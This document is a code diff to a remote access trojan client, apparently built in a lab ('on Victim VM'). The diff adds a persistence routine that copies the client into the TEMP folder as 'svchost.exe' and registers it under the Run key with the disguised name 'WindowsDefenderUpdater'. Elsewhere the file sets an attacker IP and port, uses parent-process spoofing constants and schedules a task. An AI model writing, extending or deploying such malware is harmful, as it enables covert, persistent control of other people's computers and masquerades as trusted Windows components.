@@ -1,7 +1,10 @@
 # rat_client.py (on Victim VM)
+from ctypes import cdll
+import getpass
 import socket
 import subprocess
 import os
+import sys
 import time
 import random
 import getpass
@@ -10,6 +13,8 @@ from ctypes import *
 from ctypes.wintypes import *
 
 
+import winreg  
+import shutil
 ATTACKER_IP = "192.168.56.102"
 ATTACKER_PORT = 9999
 BUFFER_SIZE = 4096
@@ -24,9 +29,56 @@ kernel32 = windll.kernel32
 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
 EXTENDED_STARTUPINFO_PRESENT = 0x00080000
 
+
+PERSISTENCE_KEY_NAME = "WindowsDefenderUpdater" 
+COPY_TO_TEMP = True 
+TEMP_FILENAME = "svchost.exe" 
 def debug_print(message):
 
     print(f"[RAT] {message}")
+
+
+def add_to_registry():
+    """Attempts to add the client script/exe path to the Windows Registry for persistence."""
+    try:
+        current_script_path = os.path.abspath(sys.argv[0])
+
+        final_path = current_script_path 
+
+        if COPY_TO_TEMP:
+            temp_dir = os.environ.get('TEMP')
+            if not temp_dir:
+                debug_print("Could not find TEMP directory for copying.")
+                final_path = current_script_path
+            else:
+                destination_path = os.path.join(temp_dir, TEMP_FILENAME)
+                try:
+                    # Copy the file
+                    shutil.copy2(current_script_path, destination_path)
+                    # Optional: Make it hidden (requires pywin32 or similar for full hidden attribute)
+                    # For basic stealth, just copying to a non-suspicious name in TEMP helps
+                    debug_print(f"Copied client to: {destination_path}")
+                    final_path = destination_path
+                except Exception as e:
+                    debug_print(f"Failed to copy file to TEMP: {e}. Using original path.")
+                    final_path = current_script_path
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+        
+            winreg.SetValueEx(key, PERSISTENCE_KEY_NAME, 0, winreg.REG_SZ, final_path)
+        
+        debug_print(f"Added persistence: {PERSISTENCE_KEY_NAME} -> {final_path}")
+        return True
+
+    except PermissionError:
+        debug_print("Permission denied adding to registry (might need higher privileges).")
+    except FileNotFoundError:
+        debug_print("Registry key not found.")
+    except Exception as e:
+        debug_print(f"Failed to add persistence via registry: {e}")
+    return False
+
+
 
 def connect_to_server():
     """Attempts to connect to the RAT server."""
@@ -213,7 +265,11 @@ def main():
     if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
         debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)...")
         time.sleep(SIMULATE_STARTUP_DELAY)
-
+    persistence_result = add_to_registry()
+    if persistence_result:
+             debug_print("Persistence setup completed.")
+    else:
+             debug_print("Persistence setup failed or skipped.")
     shedule_task_for_user()
     sock = None
     try:
